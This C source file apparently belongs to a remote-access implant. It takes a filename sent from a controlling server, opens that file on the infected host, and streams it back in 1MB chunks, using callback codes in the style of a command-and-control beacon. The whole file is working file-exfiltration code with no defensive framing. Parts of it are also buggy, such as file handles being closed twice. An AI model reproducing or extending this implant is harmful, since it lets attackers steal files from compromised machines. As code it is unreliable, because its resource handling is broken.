#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <limits.h>

#include "files.h"
#include "commands.h"
#include "debug.h"

#define MAX_PACKET_SIZE 1024 * 1024 // 1MB chunks

typedef struct file_entry {
    uint32_t id;
    uint32_t toread;
    FILE *handle;
    struct file_entry *next;
} file_entry;

static file_entry *download_list = NULL;
static uint32_t download_id = 1;
static char *read_buffer = NULL;

void process_close(file_entry *entry);

void command_download(const uint8_t *data, size_t data_len) {
    if (data_len == 0 || data_len > 1024) {
        send_output_to_server((uint8_t*)"Invalid filename length", 23, CALLBACK_ERROR);
        return;
    }

    char *fname = malloc(data_len + 1);
    if (!fname) return;
    memcpy(fname, data, data_len);
    fname[data_len] = '\0';

    FILE *infile = fopen(fname, "rb");
    if (!infile) {
        char err_msg[1024];
        int len = snprintf(err_msg, sizeof(err_msg), "Failed to open file: %s", fname);
        send_output_to_server((uint8_t*)err_msg, len, CALLBACK_ERROR);
        free(fname);
        return;
    }

    fseek(infile, 0L, SEEK_END);
    long long fsz = ftell(infile);
    fseek(infile, 0L, SEEK_SET);

    if (fsz <= 0 || fsz > 0xffffffffLL) {
        send_output_to_server((uint8_t*)"Invalid file size or file is empty", 34, CALLBACK_ERROR);
        fclose(infile);
        free(fname);
        return;
    }

    char fullname[PATH_MAX];
    if (realpath(fname, fullname) == NULL) {
        strncpy(fullname, fname, PATH_MAX);
    }
    
    file_entry *entry = (file_entry *)malloc(sizeof(file_entry));
    entry->handle = infile;
    entry->id = download_id++;
    entry->toread = fsz;
    entry->next = download_list;
    download_list = entry;

    size_t path_len = strlen(fullname);
    size_t buffer_len = 4 + 4 + path_len;
    uint8_t *out_buf = malloc(buffer_len);
    if (!out_buf) {
        fclose(infile);
        free(fname);
        return;
    }

    uint32_t id_be = htonl(entry->id);
    uint32_t size_be = htonl(fsz);

    memcpy(out_buf, &id_be, 4);
    memcpy(out_buf + 4, &size_be, 4);
    memcpy(out_buf + 8, fullname, path_len);

    send_output_to_server(out_buf, buffer_len, CALLBACK_FILE);

    free(out_buf);
    free(fname);

    if (fsz == 0) {
        process_close(entry);
    }
}

void process_download(file_entry *entry) {
    if (!read_buffer) {
        read_buffer = (char *)malloc(4 + MAX_PACKET_SIZE);
        if (!read_buffer) return;
    }

    uint32_t id_be = htonl(entry->id);
    memcpy(read_buffer, &id_be, 4);

    size_t to_read_now = (entry->toread > MAX_PACKET_SIZE) ? MAX_PACKET_SIZE : entry->toread;
    
    size_t bytes_read = fread(read_buffer + 4, 1, to_read_now, entry->handle);
    
    if (bytes_read > 0) {
        send_output_to_server((uint8_t*)read_buffer, bytes_read + 4, CALLBACK_FILE_WRITE);
        entry->toread -= bytes_read;
    } else {
        // Error or EOF
        entry->toread = 0;
    }

    process_close(entry);
}

void process_close(file_entry *entry) {
    if (entry->toread <= 0) {
        uint32_t id_be = htonl(entry->id);
        send_output_to_server((uint8_t*)&id_be, 4, CALLBACK_FILE_CLOSE);
        fclose(entry->handle);
    }
}

void command_download_stop(const uint8_t *data, size_t data_len) {
    if (data_len < 4) return;

    uint32_t fid = ntohl(*(uint32_t*)data);
    file_entry *entry = download_list;
    while (entry != NULL) {
        if (entry->id == fid) {
            entry->toread = 0;
            fclose(entry->handle);
            break;
        }
        entry = entry->next;
    }
}

void download_poll() {
    file_entry *entry = download_list;
    file_entry *prev = NULL;

    while (entry != NULL) {
        if (entry->toread > 0) {
            process_download(entry);
        }
        entry = entry->next;
    }

    entry = download_list;
    while (entry != NULL) {
        if (entry->toread <= 0) {
            if (prev == NULL) {
                download_list = entry->next;
                free(entry);
                entry = download_list;
            } else {
                prev->next = entry->next;
                free(entry);
                entry = prev->next;
            }
        } else {
            prev = entry;
            entry = entry->next;
        }
    }
}
